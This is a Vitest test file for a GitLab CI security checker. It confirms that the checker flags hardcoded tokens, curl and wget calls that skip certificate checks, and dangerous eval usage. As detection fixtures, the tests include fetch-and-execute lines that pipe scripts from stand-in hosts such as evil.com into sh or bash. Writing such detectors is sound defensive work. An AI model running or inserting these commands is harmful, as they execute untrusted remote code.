// eslint-disable no-template-curly-in-string
import { assert, describe, expect, it } from 'vitest'
import { checkSecurityIssues } from './checkSecurityIssues'
import { ProcessedConfig, type ProcessingContext } from '../ProcessedConfig'
import type { GitLabCI } from '../types'

describe('checkSecurityIssues', () => {
  const createMockContext = (overrides?: Partial<ProcessingContext>): ProcessingContext => ({
    filePath: '.gitlab-ci.yml',
    baseDir: '/project',
    includedFiles: new Set(),
    includeStack: [],
    remoteJobs: new Set(),
    gitlabHost: 'gitlab.com',
    ...overrides,
  })

  const createProcessedConfig = (
    config: GitLabCI,
    contextOverrides?: Partial<ProcessingContext>,
  ): ProcessedConfig => {
    return new ProcessedConfig(config, createMockContext(contextOverrides))
  }

  describe('global variable security issues', () => {
    it('should detect hardcoded credentials in global variables', () => {
      const config: GitLabCI = {
        variables: {
          API_KEY: 'ghp_1234567890abcdef1234567890abcdef12345678',
          PASSWORD: 'mypassword123',
          SECRET_TOKEN: 'sk-1234567890abcdef1234567890abcdef',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(1)
      expect(issues[0]).toEqual({
        severity: 'error',
        message: "Variable 'API_KEY' in global variables appears to contain hardcoded credentials",
        location: undefined,
      })
    })

    it('should not warn about secure variable references in global variables', () => {
      const config: GitLabCI = {
        variables: {
          API_KEY: '$CI_SECRET_API_KEY',
          PASSWORD: '${CI_PASSWORD}',
          SECRET_TOKEN: '$GL_SECRET_TOKEN',
          VAULT_SECRET: 'vault:secret/data/myapp',
          FILE_SECRET: 'file:/etc/secrets/api_key',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })

    it('should not warn about non-suspicious variable names', () => {
      const config: GitLabCI = {
        variables: {
          NODE_ENV: 'production',
          VERSION: 'v1.2.3',
          BUILD_TARGET: 'linux/amd64',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })

    it('should detect various suspicious variable name patterns', () => {
      const config: GitLabCI = {
        variables: {
          db_password: 'mydbpassword',
          CLIENT_SECRET: 'client_secret_123',
          access_key: 'AKIAIOSFODNN7EXAMPLE', // This will be detected as hardcoded (error)
          private_key: 'rsa_private_key_content',
          auth_token: 'bearer_token_example',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(1)
      // access_key value matches long alphanumeric pattern so will be error severity
      const errorIssues = issues.filter(issue => issue.severity === 'error')
      expect(errorIssues).toHaveLength(1)
    })

    it('should detect GitHub and GitLab token patterns', () => {
      const config: GitLabCI = {
        variables: {
          GITHUB_TOKEN: 'ghp_abcdefghijklmnopqrstuvwxyz1234567890',
          GITLAB_TOKEN: 'glpat-xxxxxxxxxxxxxxxxxxxx',
          OAUTH_TOKEN: 'gho_1234567890abcdef1234567890abcdef12345678',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(3)
      expect(issues.every(issue => issue.severity === 'error')).toBe(true)
    })
  })

  describe('job variable security issues', () => {
    it('should detect hardcoded credentials in job variables', () => {
      const config: GitLabCI = {
        'deploy:job': {
          script: ['echo "deploying"'],
          variables: {
            API_KEY: 'sk-1234567890abcdef1234567890abcdef',
            PASSWORD: 'secretpassword',
          },
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })

    it('should not warn about secure variable references in job variables', () => {
      const config: GitLabCI = {
        'deploy:job': {
          script: ['echo "deploying"'],
          variables: {
            API_KEY: '$CI_API_KEY',
            PASSWORD: '${GL_PASSWORD}',
          },
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })
  })

  describe('insecure curl commands', () => {
    it('should detect curl with -k flag', () => {
      const config: GitLabCI = {
        'test:insecure': {
          script: [
            'curl -k https://example.com/api',
            'curl --insecure https://another-site.com',
            'curl --no-check-certificate https://third-site.com',
          ],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(3)
      expect(issues[0]).toEqual({
        severity: 'warning',
        message:
          "Insecure curl command in job 'test:insecure' script (line 1): curl with -k/--insecure disables certificate verification",
        location: 'test:insecure',
      })
      expect(issues[1]).toEqual({
        severity: 'warning',
        message:
          "Insecure curl command in job 'test:insecure' script (line 2): curl with -k/--insecure disables certificate verification",
        location: 'test:insecure',
      })
      expect(issues[2]).toEqual({
        severity: 'warning',
        message:
          "Insecure curl command in job 'test:insecure' script (line 3): curl with -k/--insecure disables certificate verification",
        location: 'test:insecure',
      })
    })

    it('should detect insecure curl in different script sections', () => {
      const config: GitLabCI = {
        'test:sections': {
          before_script: ['curl -k https://setup.example.com'],
          script: ['curl --insecure https://main.example.com'],
          after_script: ['curl --no-check-certificate https://cleanup.example.com'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(3)
      // The script sections are processed in order: script, before_script, after_script
      const scriptMessages = issues.map(issue => issue.message)
      expect(scriptMessages.some(msg => msg.includes('before_script (line 1)'))).toBe(true)
      expect(scriptMessages.some(msg => msg.includes('script (line 1)'))).toBe(true)
      expect(scriptMessages.some(msg => msg.includes('after_script (line 1)'))).toBe(true)
    })

    it('should not warn about secure curl commands', () => {
      const config: GitLabCI = {
        'test:secure': {
          script: [
            'curl https://example.com/api',
            'curl -H "Authorization: Bearer $TOKEN" https://api.example.com',
            'curl --cacert /path/to/cert.pem https://secure.example.com',
          ],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })
  })

  describe('insecure wget commands', () => {
    it('should detect wget with --no-check-certificate', () => {
      const config: GitLabCI = {
        'test:wget': {
          script: [
            'wget --no-check-certificate https://example.com/file.tar.gz',
            'wget -O output.tar.gz --no-check-certificate https://example.com/archive.tar.gz',
          ],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(2)
      expect(issues[0]).toEqual({
        severity: 'warning',
        message:
          "Insecure wget command in job 'test:wget' script (line 1): wget with --no-check-certificate disables certificate verification",
        location: 'test:wget',
      })
    })

    it('should not warn about secure wget commands', () => {
      const config: GitLabCI = {
        'test:secure-wget': {
          script: [
            'wget https://example.com/file.tar.gz',
            'wget -O output.tar.gz https://example.com/archive.tar.gz',
          ],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })
  })

  describe('dangerous eval patterns', () => {
    it('should detect dangerous eval patterns', () => {
      const config: GitLabCI = {
        'test:dangerous': {
          script: [
            'eval ${DANGEROUS_VAR}',
            'eval "$USER_INPUT"',
            'eval `whoami`',
            'curl https://evil.com/script.sh | sh',
            'wget https://bad.com/malware.sh -O - | bash',
            'echo "something" | sh',
            'cat script.sh | bash',
          ],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(7)
      expect(issues.every(issue => issue.severity === 'error')).toBe(true)
      expect(
        issues.every(issue => issue.message.includes('Dangerous code execution pattern')),
      ).toBe(true)
    })

    it('should not warn about safe command patterns', () => {
      const config: GitLabCI = {
        'test:safe': {
          script: [
            'echo "Hello world"',
            'npm install',
            'docker build -t myapp .',
            'kubectl apply -f deployment.yaml',
          ],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })
  })

  describe('complex real-world scenarios', () => {
    it('should handle job with multiple security issues', () => {
      const config: GitLabCI = {
        'deploy:production': {
          variables: {
            API_SECRET: 'hardcoded_secret_value_123',
            DB_PASSWORD: 'mydbpassword',
          },
          before_script: ['curl -k https://setup.example.com'],
          script: [
            'password=secretpassword123',
            'curl https://api.example.com | sh',
            'eval ${DEPLOY_SCRIPT}',
          ],
          after_script: ['wget --no-check-certificate https://cleanup.example.com'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(4)

      // Check that we have the expected mix of severities
      const errorIssues = issues.filter(issue => issue.severity === 'error')
      const warningIssues = issues.filter(issue => issue.severity === 'warning')

      expect(errorIssues).toHaveLength(2) // eval and pipe to sh
      expect(warningIssues).toHaveLength(2) // curl -k, wget
    })

    it('should handle job with secure practices', () => {
      const config: GitLabCI = {
        'deploy:secure': {
          variables: {
            API_URL: 'https://api.example.com',
            VERSION: '$CI_COMMIT_SHA',
            SECRET: '$CI_SECRET_KEY',
          },
          before_script: [
            'echo "Setting up deployment"',
            'kubectl config use-context $KUBE_CONTEXT',
          ],
          script: [
            'docker build -t $IMAGE_NAME:$VERSION .',
            'docker push $IMAGE_NAME:$VERSION',
            'kubectl apply -f deployment.yaml',
          ],
          after_script: ['echo "Deployment completed"', 'curl $API_URL/health'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })

    it('should handle empty scripts and variables', () => {
      const config: GitLabCI = {
        'test:empty': {
          script: [],
          variables: {},
        },
        'test:no-scripts': {
          image: 'alpine:latest',
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })

    it('should handle job with only one type of security issue', () => {
      const config: GitLabCI = {
        'test:single-issue': {
          script: ['curl -k https://insecure.example.com/api'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(1)
      expect(issues[0]).toEqual({
        severity: 'warning',
        message:
          "Insecure curl command in job 'test:single-issue' script (line 1): curl with -k/--insecure disables certificate verification",
        location: 'test:single-issue',
      })
    })

    it('should detect base64-like credential patterns', () => {
      const config: GitLabCI = {
        variables: {
          SECRET_KEY: 'dGhpc2lzYXNlY3JldGtleWZvcnRlc3Rpbmc=',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)
      const issue = issues[0]!
      assert(issue)

      expect(issue.severity).toBe('error')
      expect(issue.message).toContain('appears to contain hardcoded credentials')
    })

    it('should detect hex credential patterns', () => {
      const config: GitLabCI = {
        variables: {
          API_KEY: 'a1b2c3d4e5f6789012345678901234567890abcdef',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)
      const issue = issues[0]!
      assert(issue)

      expect(issue.severity).toBe('error')
      expect(issue.message).toContain('appears to contain hardcoded credentials')
    })

    it('should not trigger on short values', () => {
      const config: GitLabCI = {
        variables: {
          SECRET: 'short',
        },
        'test:job': {
          script: ['echo "testing"'],
        },
      }

      const processedConfig = createProcessedConfig(config)
      const issues = checkSecurityIssues(processedConfig)

      expect(issues).toHaveLength(0)
    })
  })
})
